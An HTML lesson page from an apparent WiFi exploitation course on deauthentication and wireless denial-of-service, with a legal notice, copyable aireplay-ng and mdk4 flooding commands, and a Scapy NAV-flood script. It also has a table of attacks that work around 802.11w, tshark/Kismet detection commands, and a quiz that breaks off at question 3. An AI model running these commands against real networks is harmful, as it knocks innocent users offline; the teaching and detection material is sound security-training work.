<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Module 08 — Deauth & DoS | WiFi Exploitation Course</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
      --font-body:'Segoe UI',system-ui,sans-serif;
    }
    html { scroll-behavior: smooth; }
    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
    .page-wrapper { display:flex; min-height:100vh; }

    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
    .sidebar-nav { padding:16px 0; }
    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }

    main { flex:1; padding:48px 64px; max-width:960px; }

    .module-header { margin-bottom:40px; }
    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
    .breadcrumb a { color:var(--accent); text-decoration:none; }
    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }

    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
    .warning-box strong { color:#e3b341; }

    section { margin-bottom:52px; }
    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
    p { margin-bottom:12px; }

    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
    .terminal-dots { display:flex; gap:6px; }
    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
    .d-red { background:#f78166; } .d-yellow { background:#e3b341; } .d-green { background:#3fb950; }
    .terminal-title { font-size:11px; color:var(--text-dim); }
    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
    .prompt { color:var(--accent2); user-select:none; }
    .cmd { color:#e6edf3; }
    .flag { color:#ffa657; }
    .str { color:#a5d6ff; }
    .cmt { color:#6e7681; font-style:italic; }
    .out { color:var(--text-dim); }
    .out-ok { color:var(--accent2); }
    .out-warn { color:var(--warn); }
    .out-err { color:var(--accent3); }

    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
    table { width:100%; border-collapse:collapse; font-size:13px; }
    thead tr { background:rgba(88,166,255,0.06); }
    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
    tr:last-child td { border-bottom:none; }
    tr:hover td { background:rgba(88,166,255,0.03); }
    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }

    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
    .callout.info { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
    .callout.attack { background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
    .callout.tip { background:rgba(63,185,80,0.07); border-left:3px solid var(--accent2); }
    .callout.warn { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
    .callout .ci { flex-shrink:0; font-size:16px; }
    .callout strong { color:var(--text-head); }

    /* Attack cards */
    .attack-cards { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:16px; margin:20px 0; }
    .attack-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; }
    .attack-card h4 { font-size:14px; color:var(--text-head); margin-bottom:10px; }
    .attack-card .desc { font-size:12px; color:var(--text-dim); }

    /* Deauth simulator */
    .deauth-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
    .sim-controls { display:flex; gap:12px; margin-bottom:16px; flex-wrap:wrap; align-items:flex-end; }
    .sim-control { display:flex; flex-direction:column; gap:6px; }
    .sim-control label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
    .sim-control select, .sim-control input { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; }
    .sim-control select:focus, .sim-control input:focus { border-color:var(--accent); }
    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; }
    .sim-btn:hover { background:#79c0ff; }
    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:120px; white-space:pre-wrap; }
    .sim-spinner { display:inline-block; animation:spin 0.8s linear infinite; }
    @keyframes spin { to { transform:rotate(360deg); } }

    /* Nav footer */
    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
    .nav-btn.next { background:var(--accent); color:#0d1117; }
    .nav-btn.next:hover { background:#79c0ff; }
    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }

    /* Quiz */
    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
    .quiz-question { margin-bottom:28px; }
    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
    .option-list { display:flex; flex-direction:column; gap:8px; }
    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
    .option-btn:disabled { cursor:default; }
    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
    .quiz-feedback.show { display:block; }
    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
    .quiz-score.show { display:block; }
    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }

    ::-webkit-scrollbar { width:6px; height:6px; }
    ::-webkit-scrollbar-track { background:var(--bg); }
    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }

    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
  </style>
</head>
<body>
<div class="page-wrapper">

  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-logo">
      <div class="course-title">WiFi Exploitation Course</div>
      <h2>Wireless Security</h2>
    </div>
    <nav class="sidebar-nav">
      <div class="sidebar-section-label">Tier 1 — Foundations</div>
      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
      <div class="sidebar-section-label">Tier 2 — Recon</div>
      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
      <div class="sidebar-section-label">Tier 3 — Legacy</div>
      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
      <a href="#" class="active"><span class="mod-num">08</span> Deauth &amp; DoS</a>
      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
      <div class="sidebar-section-label">Tier 7 — WPS</div>
      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
      <div class="sidebar-section-label">Tier 8 — Modern</div>
      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
      <div class="sidebar-section-label">Tier 9 — Chaining</div>
      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
    </nav>
  </aside>

  <main>
    <div class="module-header">
      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 08</div>
      <div class="module-badge">&#9679; Tier 5 &mdash; Active Attacks</div>
      <h1>Deauthentication &amp; Wireless DoS</h1>
      <p class="subtitle">Learn to perform deauthentication attacks, disrupt wireless networks, and understand how management frame protection works and can be bypassed.</p>
      <div class="meta-row">
        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Intermediate</div>
        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~35 min</div>
        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Adapter required</div>
      </div>
    </div>

    <div class="warning-box">
      <p><strong>Legal Notice:</strong> Deauthentication and DoS attacks must only be performed on networks you own or have explicit written authorization to test. These attacks disrupt network connectivity.</p>
    </div>

    <!-- Section 1: How It Works -->
    <section id="how">
      <h2><span class="section-num">01</span> How Deauth Attacks Work</h2>
      <p>Deauthentication frames are management frames that tell clients to disconnect. Historically, they were unauthenticated and unencrypted.</p>

      <div class="callout attack">
        <span class="ci">&#9889;</span>
        <div><strong>The vulnerability:</strong> Anyone can send a deauth frame claiming to be the AP. Clients obey without verification. This is why deauth is so effective for handshake capture and DoS.</div>
      </div>

      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>Attack</th><th>Effect</th><th>Legitimate Use</th></tr>
          </thead>
          <tbody>
            <tr><td>Deauth Broadcast</td><td>Disconnect ALL clients</td><td>Handshake capture</td></tr>
            <tr><td>Deauth Targeted</td><td>Disconnect ONE client</td><td>Precision attacks</td></tr>
            <tr><td>Beacon Flood</td><td>Overwhelm client scanning</td><td>Cover Evil Twin</td></tr>
            <tr><td>Auth Flood</td><td>Exhaust AP resources</td><td>DoS attack</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- Section 2: Commands -->
    <section id="commands">
      <h2><span class="section-num">02</span> Deauth Attack Commands</h2>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Broadcast deauth (all clients)</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-deauth1')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-deauth1"><span class="cmt"># Send 10 deauth frames to all clients</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span>

<span class="cmt"># Infinite deauth (until Ctrl+C)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">0</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Targeted deauth (specific client)</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-deauth2')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-deauth2"><span class="cmt"># Target specific client</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">11:22:33:44:55:66</span> wlan0mon</span>

<span class="cmt"># -a = AP BSSID</span>
<span class="cmt"># -c = Target client MAC</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">mdk4 beacon flooding</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-mdk4')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-mdk4"><span class="cmt"># Beacon flood with random SSIDs</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">b</span></span>

<span class="cmt"># Beacon flood with wordlist</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">b</span> <span class="flag">-f</span> <span class="str">ssid-wordlist.txt</span></span></div>
      </div>
    </section>

    <!-- Section 3: 802.11w -->
    <section id="protection">
      <h2><span class="section-num">03</span> Management Frame Protection (802.11w)</h2>
      <p>802.11w adds encryption to management frames, making traditional deauth attacks ineffective.</p>

      <div class="callout info">
        <span class="ci">&#128274;</span>
        <div><strong>802.11w (MFP):</strong> Encrypts deauthentication and disassociation frames. When enabled, you cannot simply send fake deauth frames — they will be rejected by clients.</div>
      </div>

      <div class="table-wrap">
        <table>
          <thead>
            <tr><th>MFP Setting</th><th>Protection</th><th>Attack Impact</th></tr>
          </thead>
          <tbody>
            <tr><td>Disabled</td><td>None</td><td>Full deauth works</td></tr>
            <tr><td>Optional</td><td>Partial</td><td>May work</td></tr>
            <tr><td>Mandatory</td><td>Full</td><td>Deauth blocked</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- Section 4: Simulator -->
    <section id="simulator">
      <h2><span class="section-num">04</span> Deauth Attack Simulator</h2>
      <p>Simulate a deauthentication attack scenario.</p>

      <div class="deauth-sim">
        <h3>&#128301; Deauth Attack Simulation</h3>
        <div class="sim-controls">
          <div class="sim-control">
            <label>Attack Type</label>
            <select id="attackType">
              <option value="broadcast">Broadcast Deauth</option>
              <option value="targeted">Targeted Deauth</option>
              <option value="beacon">Beacon Flood (mdk4)</option>
            </select>
          </div>
          <div class="sim-control">
            <label>Frame Count</label>
            <select id="frameCount">
              <option value="10">10 frames</option>
              <option value="50">50 frames</option>
              <option value="0">Continuous</option>
            </select>
          </div>
          <button class="sim-btn" onclick="runDeauthSim()">Launch Attack</button>
        </div>
        <div class="sim-output" id="simOutput"><span style="color:var(--text-dim);">Configure attack above and click "Launch Attack"...</span></div>
      </div>
    </section>

    <!-- Section 5: mdk4 Full Reference -->
    <section id="mdk4">
      <h2><span class="section-num">05</span> mdk4 — Full Mode Reference</h2>
      <p>mdk4 provides specialized wireless DoS beyond simple deauth. Each mode targets a different layer of the protocol stack.</p>

      <div class="table-wrap">
        <table>
          <thead><tr><th>Mode</th><th>Letter</th><th>Target</th><th>Effect</th></tr></thead>
          <tbody>
            <tr><td>Beacon Flood</td><td><code>b</code></td><td>All clients in range</td><td>Overwhelms scanning, conceals real APs</td></tr>
            <tr><td>Auth Flood</td><td><code>a</code></td><td>AP association table</td><td>Fills table, blocks legitimate clients</td></tr>
            <tr><td>Deauth Amok</td><td><code>d</code></td><td>AP clients</td><td>Continuous disconnection, with blacklist/whitelist</td></tr>
            <tr><td>Michael Shunning</td><td><code>m</code></td><td>TKIP networks only</td><td>Triggers AP MIC lockout (60s DoS)</td></tr>
            <tr><td>EAPOL Flooding</td><td><code>e</code></td><td>AP state machine</td><td>Floods AP with auth starts → CPU exhaustion</td></tr>
            <tr><td>WIDS Confusion</td><td><code>w</code></td><td>Wireless IDS</td><td>Fake attack signatures to confuse WIDS sensors</td></tr>
          </tbody>
        </table>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">mdk4 — all modes with full flags</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-mdk4-full')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-mdk4-full"><span class="cmt"># Deauth Amok mode — with target, whitelist, and speed control</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">d</span> <span class="flag">-B</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-w</span> <span class="str">whitelist.txt</span> <span class="flag">-s</span> <span class="str">300</span> <span class="flag">-c</span> <span class="str">6</span></span>
<span class="cmt"># -B BSSID     → target only this AP (omit for all APs)</span>
<span class="cmt"># -w file      → whitelist: do NOT deauth these MACs</span>
<span class="cmt"># -b file      → blacklist: ONLY deauth these MACs</span>
<span class="cmt"># -s N         → speed in packets/sec (default: 480)</span>
<span class="cmt"># -c N         → lock to channel N</span>

<span class="cmt"># Authentication flood — fills AP's association table</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">a</span> <span class="flag">-B</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-s</span> <span class="str">300</span></span>
<span class="cmt"># Sends thousands of association requests from random MACs</span>
<span class="cmt"># AP's station table fills up → legitimate clients refused</span>

<span class="cmt"># EAPOL Start flooding — state machine exhaustion</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">e</span> <span class="flag">-t</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-s</span> <span class="str">200</span></span>
<span class="cmt"># Floods AP with EAPOL-Start → AP generates ANonces → CPU/memory exhaustion</span>

<span class="cmt"># Beacon flood with WPA2 tags + custom SSID file</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">b</span> <span class="flag">-f</span> <span class="str">ssids.txt</span> <span class="flag">-w</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-s</span> <span class="str">500</span></span>
<span class="cmt"># -f file      → SSID list (one per line)</span>
<span class="cmt"># -w           → add WPA2 tags to fake beacons (appear encrypted)</span>
<span class="cmt"># -g           → use 54 Mbit 802.11g rates</span></div>
      </div>
    </section>

    <!-- Section 6: Advanced DoS Techniques -->
    <section id="advanced">
      <h2><span class="section-num">06</span> Advanced DoS Techniques</h2>

      <h3>NAV-Based DoS — Silencing the Channel</h3>
      <p>The Duration/ID field in every 802.11 frame sets how long other stations must defer. Sending frames with the maximum Duration (32,767 µs) blocks all transmission without any deauth.</p>

      <div class="callout attack">
        <span class="ci">&#9889;</span>
        <div><strong>PMF immune:</strong> NAV DoS exploits the Duration field in data/control frames — it cannot be blocked by 802.11w which only protects management frames like deauth/disassoc.</div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">NAV DoS + Michael Shunning</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-nav')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-nav"><span class="cmt"># NAV DoS — Scapy: maximum Duration field silences all stations</span>
<span class="out">from scapy.all import *</span>
<span class="out">from scapy.layers.dot11 import Dot11, RadioTap</span>
<span class="out"></span>
<span class="out">frame = (</span>
<span class="out">    RadioTap() /</span>
<span class="out">    Dot11(type=<span class="str">2</span>, subtype=<span class="str">4</span>,       <span class="cmt"># Data Null function</span></span>
<span class="out">          FCfield=<span class="str">0x01</span>,              <span class="cmt"># ToDS=1</span></span>
<span class="out">          addr1=<span class="str">"ff:ff:ff:ff:ff:ff"</span>,</span>
<span class="out">          addr2=<span class="str">"00:11:22:33:44:55"</span>,</span>
<span class="out">          addr3=<span class="str">"ff:ff:ff:ff:ff:ff"</span>,</span>
<span class="out">          ID=<span class="str">0x7FFF</span>)               <span class="cmt"># Duration = 32,767 µs (maximum)</span></span>
<span class="out">)</span>
<span class="out">sendp(frame, iface=<span class="str">"wlan0mon"</span>, loop=True, inter=<span class="str">0.001</span>)</span>

<span class="cmt"># Michael Shunning — trigger TKIP MIC lockout (DoS for 60s)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo mdk4 wlan0mon <span class="flag">m</span> <span class="flag">-B</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-t</span> <span class="str">11:22:33:44:55:66</span></span>
<span class="cmt"># Only effective against WPA-TKIP APs (NOT WPA2-CCMP)</span>
<span class="cmt"># 2 MIC failures in 60s → AP lockout for 60s → all clients disconnected</span></div>
      </div>
    </section>

    <!-- Section 7: PMF Bypass Reference -->
    <section id="pmf-bypass">
      <h2><span class="section-num">07</span> PMF Status &amp; Bypass Reference</h2>

      <div class="table-wrap">
        <table>
          <thead><tr><th>Approach</th><th>vs PMF Disabled</th><th>vs PMF Capable</th><th>vs PMF Required</th></tr></thead>
          <tbody>
            <tr><td>Deauth injection (aireplay-ng)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--warn)">Pre-assoc only</td><td style="color:var(--accent3)">✗ Blocked</td></tr>
            <tr><td>NAV DoS (Duration field)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
            <tr><td>EAPOL flooding (mdk4 e)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
            <tr><td>Auth flooding (mdk4 a)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
            <tr><td>Beacon flooding (mdk4 b)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
            <tr><td>PMKID attack (Module 12)</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td><td style="color:var(--accent2)">✓ Works</td></tr>
            <tr><td>Michael shunning (mdk4 m)</td><td style="color:var(--accent2)">TKIP only</td><td style="color:var(--accent2)">TKIP only</td><td style="color:var(--accent2)">TKIP only</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- Section 8: Detection -->
    <section id="detection">
      <h2><span class="section-num">08</span> Detection &amp; Countermeasures</h2>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">tshark — deauth attack detection</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-detect')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-detect"><span class="cmt"># Count deauth frames per source MAC (find the attacker)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture.pcapng <span class="flag">-Y</span> <span class="str">"wlan.fc.type_subtype==12"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> wlan.sa | sort | uniq -c | sort -rn</span>
<span class="out-err">  847  AA:BB:CC:DD:EE:FF   ← 847 deauths from one MAC = ATTACKER</span>

<span class="cmt"># Show reason codes (7 = aireplay-ng injected)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture.pcapng <span class="flag">-Y</span> <span class="str">"wlan.fc.type_subtype==12"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> wlan.sa <span class="flag">-e</span> wlan.da <span class="flag">-e</span> wlan_mgt.fixed.reason_code</span>
<span class="out-err">AA:BB:CC:DD:EE:FF   ff:ff:ff:ff:ff:ff   7   ← injected broadcast deauth</span>

<span class="cmt"># Live monitoring (correct tcpdump syntax)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo tcpdump <span class="flag">-i</span> wlan0mon <span class="flag">-e</span> <span class="str">'(type mgt subtype deauth) or (type mgt subtype disassoc)'</span></span>

<span class="cmt"># Kismet IDS — automatic deauth flood alerting</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo kismet <span class="flag">-c</span> wlan0mon</span>
<span class="cmt"># Auto-alerts on: deauth floods, beacon floods, rogue APs, PMKID captures</span></div>
      </div>
    </section>

    <!-- Section 9: Quiz -->
    <section id="quiz">
      <h2><span class="section-num">09</span> Knowledge Check</h2>

      <div class="quiz-container">
        <h3>&#127358; Module 08 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>

        <!-- Q1 -->
        <div class="quiz-question" id="q1">
          <div class="q-num">Question 1 of 8</div>
          <div class="q-text">A deauthentication frame drops a client from State 3 to which state, and what must the client do to resume data transmission?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q1',false)">State 2 — client must re-associate only</button>
            <button class="option-btn" onclick="answer(this,'q1',true)">State 1 — client must re-authenticate AND re-associate, triggering a full WPA2 4-way handshake</button>
            <button class="option-btn" onclick="answer(this,'q1',false)">State 0 — client must rediscover the AP and re-scan</button>
            <button class="option-btn" onclick="answer(this,'q1',false)">State 2 — client must perform a new 4-way handshake only</button>
          </div>
          <div class="quiz-feedback" id="fb-q1"></div>
        </div>

        <!-- Q2 -->
        <div class="quiz-question" id="q2">
          <div class="q-num">Question 2 of 8</div>
          <div class="q-text">Why can't 802.11w (PMF Required) block a NAV-based DoS attack?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q2',false)">Because PMF only applies to WPA3 networks, not WPA2</button>
            <button class="option-btn" onclick="answer(this,'q2',true)">Because NAV DoS exploits the Duration/ID field in data/control frames — 802.11w only encrypts management frames like deauth and disassoc</button>
            <button class="option-btn" onclick="answer(this,'q2',false)">Because the NAV field is encrypted separately from the frame body</button>
            <button class="option-btn" onclick="answer(this,'q2',false)">Because NAV DoS uses broadcast frames that PMF cannot filter</button>
          </div>
          <div class="quiz-feedback" id="fb-q2"></div>
        </div>

        <!-- Q3 -->
        <div class="quiz-question" id="q3">
          <div class="q-num">Question 3 of 8</div>
          <div class="q-text">What does mdk4's authentication flooding mode (<code>a</code>) exhaust, and what is the effect on legitimate users?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q3',false)">It exhausts the AP's CPU with encryption calculations, causing all frames to be dropped</button>
